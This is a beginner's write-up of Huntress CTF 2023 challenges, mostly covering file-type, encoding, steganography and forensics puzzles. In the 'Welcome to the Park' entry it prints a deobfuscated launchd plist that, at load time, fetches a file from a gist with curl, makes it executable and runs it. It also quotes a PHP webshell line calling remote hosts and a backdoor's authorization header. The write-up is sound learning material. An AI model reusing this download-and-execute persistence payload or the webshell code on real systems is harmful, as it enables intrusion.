This was my first CTF challenge and even more my first write up.
Some of it are just random notes written down while doing the challenges and aren't anywhere near completion others are full writeups so it's possible to understand which step are required to solve the challenges. I've learned a lot about CTF and also about writing documentation so it is possible for others to understand what I've done. 

# Huntress CTF Oktober 2023
## Book by its cover:
"They say you aren't supposed to judge a book by its cover, but this is one of my favorites!"

Files: book.rar

When you download the file it seems like its a rar archive, but if you use `file book.rar`

It will respond with:

`book.rar: PNG image data, 800 x 200, 8-bit/color RGB, non-interlaced`

You then want to convert the file to a png file, to do that you have to do the following:

`mv book.rar book.png`

Afterwards you can open the picture in the GUI and view the flag

### flag{f8d32a346745a6c4bf4e9504ba5308f0}
---
## Notepad:
"Just a sanity check... you do know how to use a computer, right?"

Files: notepad

To begin with we download the file and file it to view what kind of file we have our hands on.

`notepad: Unicode text, UTF-8 text`

Afterwards its a simple `cat notepad` to reveal:

```
+------------------------------------------------------+
| [✖] [□] [▬]  Notepad                               - |
|------------------------------------------------------|
| File   Edit   Format   View   Help                   |
|------------------------------------------------------|
|                                                      |
|                                                      |
|   New Text Document - Notepad                        |
|                                                      |
|     flag{2dd41e3da37ef1238954d8e7f3217cd8}           |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
|                                                      |
+------------------------------------------------------+
| Ln 1, Col 40                                         |
+------------------------------------------------------+
```

### flag{2dd41e3da37ef1238954d8e7f3217cd8} 
---
## String Cheese:

"Oh, a cheese stick! This was my favorite snack as a kid. My mom always called it by a different name though... "

First I started by downloading the file and check it contents. 

Flag found in the hex value of the picutre

### flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
---
## Read the rules:
"Please follow the rules for this CTF!"
### flag{90bc54705794a62015369fd8e86e557b} 
---
## Technical Support:
"Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?"
### flag{a98373a74abb8c5ebb8f5192e034a91c}
---
## Query Code
"What's this?"

When you download the file it is name "query_code" and the first step is to find out what kind of file it is.
To do that we enter `file query_code` and the terminal responds with `query_code: PNG image data, 111 x 111, 1-bit colormap, non-interlaced` so this file is a png image file we then have to rename the file to a *.png* file. We do that by `mv query_code query_code.png`
We can now open the file and it reveals a QR code. Scan it with a phone and fetch the flag.

### flag{3434cf5dc6a865657ea1ec1cb675ce3b}
---
## HumanTwo
"During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the `human2.aspx` webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?"

Steps:
```bash
grep '(!String.Equals(pass,' * -R
subl cc53495bb42e4f6563b68cdbdd5e4c2a9119b498b488f53c0f281d751a368f19
get string:
	if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))
From hex: 666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d
```
### flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}
---
## BaseFFFF+1
"Maybe you already know about base64, but what if we took it up a notch?"

To solve this challenge we first analyse what kind of file it is with the `file` command.
We see it's a unicode text `baseffff1: Unicode text, UTF-8 text, with no line terminators` so lets see what's inside the file, we do that by using the cat command
`cat baseffff1` and we get a string that have some very wierd characters in it.
```
鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸
```

If you take the hexidecimal value of *FFFF* of the file name and decode it you get the number 65.535, and when you take the name of the file into account you can deduct that it might got something to do with 65.535+1.
If you go Cyberchef you will see that it has an option to decode *base65536* 
if you enter the string it will reveal the flag.

### flag{716abce880f09b7cdc7938eddf273648}
---
## Traffic
"We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?   
  
Some tools like [`rita`](https://github.com/activecm/rita) or [`zeek`](https://github.com/zeek/zeek) might help dig through all of this data!"

I started by unzipping the file by using `gunzip *.gz`
It was mentioned in the description that there might be something about a sketchy site. So I started by something for something name *sketchy*
To do this I used the `grep` command to search for any mentioning of this in the log files.

`grep -E sketchy *.log`

The command reveals there are plenty of log intries about 
```
ssl.03:00:00-03:53:19.log:1631072773.151055     CCczHL2a9zDFsSWjGd      10.24.0.2 61758    185.199.108.153 443     TLSv12  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256   - sketchysite.github.io    T       -       -       T       CsiI    -       -       - -`
```
So lets check the site out! When you get to the site you are presented with the flag.

### flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
---
## Zerion
"We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?"

This is the first challenge that involves obfuscation of code, which means that the code itself is encoded so it's hard for the human eye to understand what it does.

We start by extracting the contents of `test.gz` and we afterwards `file` the output.

We can see its a php script that does something.

`zerion: PHP script, ASCII text, with very long lines (14780), with no line terminators`

So lets start by opening the file in a text editor, my go to is Sublime Text.

In the beginning of the code we can see a specific function following, what seems to be base64 obfuscated code.

`base64_decode(strrev(str_rot13($L66Rgr[1]))))`

By this line we can see that the code is first obfuscated using `str_rot13` after that it the code is reversed by using `strrev` and finally it is encoded using base64.

So to decode the code easy we can go to Cyberchef and insert the obfuscated code. We can take the base64 encoded string and set Cyberchef to first ROT13, then reverse the string and finally base64 decode the string.

When it have baked the code, we take the output and save it into a new text file.

Next step is to find the url where the flag is hiding. We do that by using the following command `cat output.txt | grep http` from the output the flag is revealed:

```bash
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('https://c.-wic5-.com/'); if(!$code){$code = GC('https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883}

```
### flag{af10370d485952897d5183aa09e19883}
---
## Caesarmirror
"Caesar caesar, on the wall, who is the fairest of them all?   
  
Perhaps a clever ROT13?"


Rot13 the file first
Reverse the text
and reverse the other part as well

### flag{julius_in_a_reflection} 
---
## I wont let you down
"OK Go take a look at this IP:   
Connect here: [http://155.138.162.158](http://155.138.162.158/)"

http://155.138.162.158/

nmap -F 155.138.162.158
watch website
wget 155.138.162.158:8888
cat index.html

### flag{93671c2c38ee872508770361ace37b02}
---
## Dialtone
"Well would you listen to those notes, that must be some long phone number or something!"

Download the dialtone.wav file
Decode it using a DTMF decoder
	13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
Convert the BigInt to Hexidecimal
Cyberchef it "from Hex"

### flag{6c733ef09bc4f2a4313ff63087e25d67}
---
## PHP Stager
"Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?"
### flag{9b5c4313d12958354be6284fcd63dd26}
---
## Layered Security
"It takes a team to do security right, so we have layered our defenses!"

Open the file in Gimp
Disable a couple of layers

### flag{9a64bc4a390cb0ce31452820ee562c3f}
---
## Comprezz
"Someone stole my S's and replaced them with Z's! Have you ever seen this kind of file before?"

Rename the file and uncompress the file using uncompress

mv comprezz comprez.z
uncompress comprez.z
cat comprez.z

### flag{196a71490b7b55c42bf443274f9ff42b}
---
## F12
"Remember when Missouri got into hacking!?! You gotta be _fast_ to catch this flag!"

View source
Search for
```
  <script type="text/javascript">
        function ctf() {
            window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
        }
```

Go to that site and view source and search for flag

### flag{03e8ba07d1584c17e69ac95c341a2569}
---
## Where am i?

In this challenge we get a image file and somewhere in the image a flag is hidding. I used the `exiftool` to look what kind of data that is associated witht he file. The exif data in an image contains all sorts of data that have something to do with the image.

`exiftool PXL_20230922_231845140_2.jpg`

That command return:

```
ExifTool Version Number         : 12.57
File Name                       : PXL_20230922_231845140_2.jpg
Directory                       : .
File Size                       : 1641 kB
File Modification Date/Time     : 2023:10:10 20:48:50+02:00
File Access Date/Time           : 2023:10:10 20:49:29+02:00
File Inode Change Date/Time     : 2023:10:10 20:49:15+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Image Description               : ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=
Make                            : Google
Camera Model Name               : Pixel Fold
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : HDR+ 1.0.540104767zd
Modify Date                     : 2023:09:22 19:18:45
Y Cb Cr Positioning             : Centered
Exposure Time                   : 1/2666
F Number                        : 1.7
Exposure Program                : Program AE
ISO                             : 46
Sensitivity Type                : ISO Speed
Exif Version                    : 0232
Date/Time Original              : 2023:09:22 19:18:45
Create Date                     : 2023:09:22 19:18:45
Offset Time                     : -04:00
Offset Time Original            : -04:00
Offset Time Digitized           : -04:00
Components Configuration        : Y, Cb, Cr, -
Shutter Speed Value             : 1/2048
Aperture Value                  : 1.4
Brightness Value                : 9.03
Exposure Compensation           : 0
Max Aperture Value              : 1.7
Subject Distance                : 3.772 m
Metering Mode                   : Center-weighted average
Flash                           : Off, Did not fire
Focal Length                    : 4.5 mm
Sub Sec Time                    : 140
Sub Sec Time Original           : 140
Sub Sec Time Digitized          : 140
Flashpix Version                : 0100
Color Space                     : sRGB
Exif Image Width                : 3000
Exif Image Height               : 4000
Interoperability Index          : R98 - DCF basic file (sRGB)
Interoperability Version        : 0100
Sensing Method                  : One-chip color area
Scene Type                      : Directly photographed
Custom Rendered                 : Custom
Exposure Mode                   : Auto
White Balance                   : Auto
Digital Zoom Ratio              : 2.5
Focal Length In 35mm Format     : 49 mm
Scene Capture Type              : Standard
Contrast                        : Normal
Saturation                      : Normal
Sharpness                       : Normal
Subject Distance Range          : Distant
Lens Make                       : Google
Lens Model                      : Pixel Fold back camera 4.53mm f/1.7
Composite Image                 : Composite Image Captured While Shooting
GPS Version ID                  : 2.3.0.0
GPS Latitude Ref                : North
GPS Longitude Ref               : West
GPS Altitude Ref                : Above Sea Level
GPS Time Stamp                  : 23:18:36
GPS Dilution Of Precision       : 43
GPS Img Direction Ref           : Magnetic North
GPS Img Direction               : 73
GPS Processing Method           : fused
GPS Date Stamp                  : 2023:09:22
Compression                     : JPEG (old-style)
Thumbnail Offset                : 1444
Thumbnail Length                : 11879
JFIF Version                    : 1.02
Profile CMM Type                : 
Profile Version                 : 4.0.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2023:03:09 10:57:00
Profile File Signature          : acsp
Primary Platform                : Unknown ()
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Google
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Google
Profile ID                      : 61473528d5aaa311e143dfc93efaa268
Profile Description             : sRGB IEC61966-2.1
Profile Copyright               : Copyright (c) 2023 Google Inc.
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43604 0.22249 0.01392
Green Matrix Column             : 0.38512 0.7169 0.09706
Blue Matrix Column              : 0.14305 0.06061 0.71391
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Chromatic Adaptation            : 1.04788 0.02292 -0.05019 0.02959 0.99048 -0.01704 -0.00922 0.01508 0.75168
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
XMP Toolkit                     : Adobe XMP Core 5.1.0-jc003
Has Extended XMP                : 5ED7F3B831F9D9D205DAFF353924EAB2
Image Width                     : 3000
Image Height                    : 4000
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
HDRP Maker Note                 : (Binary data 65253 bytes, use -b option to extract)
Shot Log Data                   : (Binary data 585 bytes, use -b option to extract)
Aperture                        : 1.7
Image Size                      : 3000x4000
Megapixels                      : 12.0
Scale Factor To 35 mm Equivalent: 10.8
Shutter Speed                   : 1/2666
Create Date                     : 2023:09:22 19:18:45.140-04:00
Date/Time Original              : 2023:09:22 19:18:45.140-04:00
Modify Date                     : 2023:09:22 19:18:45.140-04:00
Thumbnail Image                 : (Binary data 11879 bytes, use -b option to extract)
GPS Altitude                    : 254.4 m Above Sea Level
GPS Date/Time                   : 2023:09:22 23:18:36Z
GPS Latitude                    : 33 deg 46' 14.88" N
GPS Longitude                   : 84 deg 21' 51.22" W
Circle Of Confusion             : 0.003 mm
Depth Of Field                  : 26.33 m (2.02 - 28.35 m)
Field Of View                   : 40.3 deg
Focal Length                    : 4.5 mm (35 mm equivalent: 49.0 mm)
GPS Position                    : 33 deg 46' 14.88" N, 84 deg 21' 51.22" W
Hyperfocal Distance             : 4.35 m
Light Value                     : 14.0
Lens ID                         : Pixel Fold back camera 4.53mm f/1.7
```
When you look at the image description, you can see that there are a base64 encoded string. Lets copy paste that string in to a text file to decode it.

`echo ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik= > description.b64`

Now lets decode the string in the description.b64

We do that by using the base64 tool.

`base64 -d description.b64`

The `-d` paramter will tell the tool that the following file should be decoded and outputted in the terminal

```
base64 -d description.b64         
flag{b11a3f0ef4bc170ba9409c077355bba2) 
```

### flag{b11a3f0ef4bc170ba9409c077355bba2)
---
## Chicken Wings
"I ordered chicken wings at the local restaurant, but uh... this really isn't what I was expecting..."

If you know, you know :)

Take the UTF-8 encoded data and paste it into a windings translation

### flag{e0791ce68f718188c0378b1c0a3bdc9e}
---
## Dumpster Fire
"We found all this data in the dumpster! Can you find anything interesting in here, like any cool passwords or anything? Check it out quick before the foxes get to it!"

Install firefox decrypt from "https://github.com/unode/firefox_decrypt"

cd to the directory ".../huntressctf/dumpsterfire/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
"
```
python3 firefox_decrypt.py ~/huntressctf/dumpsterfire/home/challenge/.mozilla/firefox/bc1m1zlr.default-release/
```

### flag{35446041dc161cf5c9c325a3d28af3e3}
---
## Baking
"Do you know how to make cookies? How about HTTP flavored?"

Set the magic cookies in the oven
get the cookie
base64 decode
change 7200 min back in time
base64 encode
save new cookie data
reload the page and get the flag

### flag{c36fb6ebdbc2c44e6198bf4154d94ed4} 
---
## Land before time
"This trick is nothing new, you know what to do: **iSteg**. Look for the tail that's older than time, this Spike, you shouldn't climb."

download the png file
download iSteg (java version)
run `java -jar iSteg-v2.1_GUI.jar`
load the png file and show secret

### flag{da1e2bf9951c9eb1c33b1d2008064fee}
---
## M365

*General info*
Get-AADIntTenantDetails
### flag{dd7bf230fde8d4836917806aff6a6b27}

*Conditional Acess Policies*
Get-AADIntAzureADPolicies
### flag{d02fd5f79caa273ea535a526562fd5f7}   

*Teams*
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName

*The President*
Get-ADDIntUsers
### flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
---
## Opposable Thumbs
"We uncovered a database. Perhaps the flag is right between your fingertips!"

Download thumbviewer
open the thumb256.db file
view the jpeg and read the flag
### flag{human_after_all}
---
## Wimble
"_"Gretchen, stop trying to make fetch happen! It's not going to happen!"_ - Regina George, Mean Girls"

Extract the "winble.7z"
extract the fetch with 7z again
view the file with Prefetch browser
navigate to wordpad.exe and read filename string

### flag{97F33C9783C21DF85D79D613BOB258BD}
---
## Opendir
"A threat actor exposed an open directory on the public internet! We could explore their tools for some further intelligence. Can you find a flag they might be hiding?"
```bash
wget --user opendir --password opendir -m (challenge website)
grep -r 'flag' .
```
### flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
---
## Welcome to the Park
"The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him?"

First we unzip the file and start to look around, to see what we have our hands on. I ended up in the folder `welcome/Chrome.app/Contents/Resources` and found the file `interesting_thing.command`

As the filename suggest, we should check this file out.

`cat interesting_thing.command` which output:
```
#!/bin/bash
# ls -a is your friend
echo "welcome to the park"
```

This hints that there might be something hidden somewhere in the folder. The `ls -a` command list everything there are in the folder and the parameter `-a` also shows hidden files.

So lets start over in the base folder and start searching for hidden folders.

`ls -a` revealed and *.hidden* folder

In that folder I found:

`welcomeToThePark: Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>`

Next up I used `strings welcomeToThePark` and found something that looked like base64 encoded data.
I copied the data and saved into a *base64.txt* and then ran `base64 -d base64.txt`

navigate to:
`/welcometothepark/welcome/.hidden`
`strings welcomeToThePark`

The output from that command is:

```bash
...
/usr/lib/libSystem.B.dylib
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
Hello World!
___stack_chk_fail
...

```
So lets decode from the string by saving it into a `base64.txt` file and decode it and save the output into a new file.

`base64 -d base64.txt > output.txt`

We then open the output.txt file in Sublime Text to see what what we have our hands on.

```bash
n<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><
plist version="1.0">
<dict>
<key>Label</key>
<string>com.huntress.ctf</string>
<key>ProgramArguments</key>
<array>
	<string>/bin/zsh</string>
	<string>-c</string>
	<string>A0b='tmp="$(m';/n/A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh
	</string>
	</array>
<key>RunAtLoad</key>
<true />
<key>StartInterval</key>
<integer>14400</integer>
</dict>
</plist>
```

This code is clearly obfuscated so it's hard for a human to read what it does. You could deobfuscate it by hand, by removing all the variables as in `A0be` etc. I found it way easier and a lot faster by using ChatGPT and let it do the hard work for me. When prompted to deobscate the code it came with the following output:

```
/bin/zsh -c 'tmp="$(mktemp /tmp/XXXXXX)";
curl --retry 5 -f "https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01" -o "${tmp}";
if [[ -s "${tmp}" ]]; then
  chmod 777 "${tmp}";
  "${tmp}";
  rm "${tmp}";
fi'
```

Go to github and download the image

First I started by looking at the exifdata, but there didn't reveal anything interresting. Next up I looked at the strings of the jpeg to see.

I used the tool `xxd` to look through the data:

`xxd JohnHammond.jpg`

That revealed the flag:
```
000045a0: bc59 d15a 8809 ca89 fb0d 3fff d93b 2066  .Y.Z......?..; f
000045b0: 6c61 677b 3638 3062 3733 3635 3635 6337  lag{680b736565c7
000045c0: 3639 3431 6133 3634 3737 3566 3036 3338  6941a364775f0638
000045d0: 3334 3636 7d                             3466}

```

### flag{680b736565c76941a364775f06383466}
---
## Veebeeeee
"While investigating a host, we found this strange file attached to a scheduled task. It was invoked with `wscript` or something... can you find a flag?"

Decoded the file using John Hammond vbs decoder
Deobfuscate the code
Go to the weblink and find the flag

### flag{ed81d24958127a2adccfb343012cebff}
---
## Backdoored Splunk
"You've probably seen Splunk being used for good, but have you seen it used for evil?"

The challenge start by spinning up the container, when you access the link you get an error "error	"Missing or invalid Authorization header"" from the site.

I went decompress the challenge files and went with a `grep -r Authorization`

I found some interesting files with the grep command

```bash
bin/powershell/nt6-health.ps1:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
```
I then ran the curl command:

`curl -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==" -X GET chal.ctf.games:32642`

and the response was:
```bash
└─$ curl -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==" -X GET chal.ctf.games:32642
<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== --> 
```
Went into cyberchef and made a From64 and the result was `echo flag{60bb3bfaf703e0fa36730ab70e115bd7}`

### flag{60bb3bfaf703e0fa36730ab70e115bd7}
---
## Discord Snowflake Scramble
"Someone sent [message on a Discord server](https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552) which contains a flag! They did mention something about being able to embed a list of online users on their own website...   
  
Can you figure out how to join that Discord server and see the message?"


We get this link *https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552* and we need to join the discord server. You cant join it just using the link, so we have to use another way in.
Its hinted in the in the description there are something about snowflakes.

Discord states: "A Snowflake is a unique ID for a resource which contains a timestamp."

You can use a discordlookup service and generate a instant invite link

`https://discordlookup.com/guild/1156647699362361364`

That will take the unique snowflake ID and look it up for you.

After you join the channel it is possible for you get retrieve the flag from the post in the top.

### flag{bb1dcf163212c54317daa7d1d5d0ce35}
---
## Tradegy

**This challenge was accidentally released including the flag and challenge information inside of the attached download.**

### flag{4d442c642df14a7267490da2bb63f522}
---
## Who is Real?
"This is **not** a technical challenge, but it is a good test of your eye!   
  
Now we live in a world of generative AI, for better or for worse. The fact of the matter is, threat actors can scheme up fake personas to lure you into a scam or social engineering... so, can you determine which profile picture is real and which is fake?"

This challenge start a game where you get to choose between 2 images, one is a real one and another is made by using AI.

After 10 correct selections you get the flag.

## Under the Bridge
"Can you find this iconic location"

## Where am I?
"Your friend thought using a JPG was a great way to remember how to login to their private server. Can you find the flag?"